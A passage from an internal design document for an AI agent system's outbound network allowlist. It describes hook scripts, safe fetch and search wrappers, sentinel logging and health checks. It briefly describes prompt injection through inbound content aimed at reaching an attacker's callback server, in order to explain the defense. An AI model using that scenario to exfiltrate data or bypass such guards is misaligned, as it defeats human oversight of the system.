   that the firewall's live traffic audit can cross-reference. No design decision made; gap is acknowledged.

---

### ★ INTEROP SEAMS (shared-state edges — the organism view)

Each seam uses a verb from the closed vocabulary.

**GUARDED-BY security-ingest-gate** · `ingest_gate_enforce.sh` redirects all raw WebFetch/WebSearch calls to
`safe_fetch.py` / `safe_search_api.sh` (inbound read security); those replacements are themselves gated by
this wall's L1+L2 Bash hooks on their invocations. The two elements share one hook file and form a
complementary inbound+outbound perimeter. Neither is redundant with the other: ingest-gate is the read-side
redirect; egress-allowlist-wall is the write/outbound-side domain check. `[hook]`

**FEEDS sentinel** · `enforce_egress_allowlist.py` appends a structured JSON block record to
`$DRIVE/system/logs/sentinel-events.jsonl` on every off-allowlist block — this is the sentinel element's
event source. Sentinel health (`sentinel-health.py`) rolls that log into `state/status/sentinel.json`;
egress blocks appear in the Sentinel dashboard tile. Logging is best-effort and never affects the block
decision. `[hook]`

**READS helm** · `health_invariants.py` (the helm / system-health element) names `guard_egress.sh` as a
CRITICAL invariant; its absence from the clone triggers a CRITICAL health failure. Helm consumes this
element's hook file as a liveness signal — egress-allowlist-wall is structurally registered in the
system's health monitor. `[honor]`

**GUARDED-BY hook-plane** · Both `guard_egress.sh` and `enforce_egress_allowlist.sh` are registered in
`settings.json` as PreToolUse Bash hooks. The hook-plane element owns the registration machinery and the
`health_invariants.py` invariant checks. Changes to hook-plane (new settings.json format, de-registration)
affect this wall's enforcement directly. `[hook]`

**COMPLEMENTS security-ingest-gate** · Where `security-ingest-gate` sanitizes inbound reads (what enters the
model's context), `egress-allowlist-wall` gates outbound sends (what the system can call out to). The two
together close the adversarial loop: an attacker who injects instructions via an inbound channel cannot
reach their callback server without passing this wall. Each is independently necessary; neither subsumes
the other. `[hook]`

**COMPLEMENTS research-web-plane** · `safe_search_api.sh` and `safe_fetch.py` are the ONLY permitted outbound
network tools for research/websearch skills (`/research`, `/websearch`, `emily-breakdown`, `marc-weekly`).
The skills' SKILL.md enforces `safe_search_api.sh` as the sole search path; `safe_fetch.py` is the sole
URL-fetch path. This wall is what MAKES them the sole path — without L3's WebFetch/WebSearch block and L2's
domain gating, the skills' enforcement would be honor-system only. `[skill]`

**FEEDS research-web-plane** · `/tmp/serper_calls_YYYYMMDD.log` (written by `safe_search_api.sh`) is the
shared daily call-cap counter. Every caller of the search gateway — across all sessions — draws from the
same `/tmp` counter file. The wall's tool writes this file; the research plane reads it. `[honor]`

**SYNCS notify-plane** · `ntfy.sh` is an approved domain in `egress-allowlist.md`. `notify-send.sh` (the
notify-plane element) makes outbound HTTPS calls to `ntfy.sh`; the allowlist entry is what structurally
permits the notification channel to exist. A change that removed `ntfy.sh` from the allowlist would sever
push notifications. `[honor]`

**SYNCS gws-plane** · `googleapis.com`, `google.com`, `gstatic.com`, `googleusercontent.com` are all in
`egress-allowlist.md`. Every `gws` CLI call targets the Google API plane; the allowlist entries are what
structurally permit the gws-plane's traffic. Changes to the allowlist propagate immediately to what gws
can reach. `[honor]`

**COMPLEMENTS two-machine-residency** · `egress-allowlist.md` and `egress-allowlist.hosts` are both
git-tracked in the clone and travel to both machines via `git push`/`git pull`. The wall's domain authority
is only as current as the last pull. The residency model is the delivery mechanism for the allowlist's hook
side; firewall sync remains manual. `[honor]`

**READS-BY label-checker (conformance-lab)** · `conformance-lab` (the label-checker's probe engine, using
`probes/guard.py` and `_verify_guards_manual.py`) fire-tests `guard_egress.sh` and `enforce_egress_allowlist.sh`
with synthetic allow/block probes to produce the LIVE/PARTIAL verdict. It reads the hook files and the
allowlist domain set. The checker is what makes LIVE a meaningful claim, not just an authored label. `[honor]`

---

## AUTO-COMPUTED   (machine-only — written by the Feature 1.5 `label_checker.py`)
- **maturity_label:** LIVE·gap
- **check_detail:** "pending label_checker.py"
